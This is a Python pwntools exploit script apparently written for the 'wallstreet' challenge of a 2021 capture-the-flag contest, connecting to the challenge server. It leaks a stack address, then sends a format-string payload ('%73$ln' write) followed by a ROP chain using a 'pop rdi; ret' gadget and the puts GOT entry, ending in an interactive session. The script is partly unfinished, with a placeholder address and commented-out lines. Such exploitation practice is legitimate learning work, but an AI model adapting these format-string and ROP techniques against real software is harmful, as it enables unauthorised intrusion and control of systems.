#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.2021.chall.actf.co --port 21800 wallstreet
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('wallstreet')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.2021.chall.actf.co'
port = int(args.PORT or 21800)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

with start() as io:
    io.sendlineafter('1) Buy some stonks!\n', '1')
    #pause()
    io.sendlineafter('What stonk do you want to see?\n', args.X or '68')
    #io.recvuntil('What stonk do you want to see?\n')

    leak = io.recvuntil('\nWhat is your API token?\n', drop=True)
    leak = leak.ljust(8, b'\x00')

    if len(leak) > 8:
        print("cuttting leak to 8B")
        leak = leak[:8]

    leak = u64(leak)

    print("Addr from stack = %#x" % leak)

    pause()

    rop = b''.join((
        p64(0x4040e0), # RBP
        #p64(0x4014bd), # main
        #p64(0x4011B0), #start
        p64(0x00000000004015c3), #: pop rdi; ret;
        p64(exe.got['puts']), # got puts
        #p64(exe.plt['_printf']), # got puts
        p64(0x40404040),
    ))

    #for r in rop:
    #0x41
    #0x78


    i=0x4040e0 + 0x20 # user_buf + 32
    payload = '%{}c'.format(i).encode() + b'%73$ln'
    payload += b'\x00' * (32-len(payload))
    payload += rop
    assert len(payload) <= 300

    io.sendline(payload)

    io.interactive()
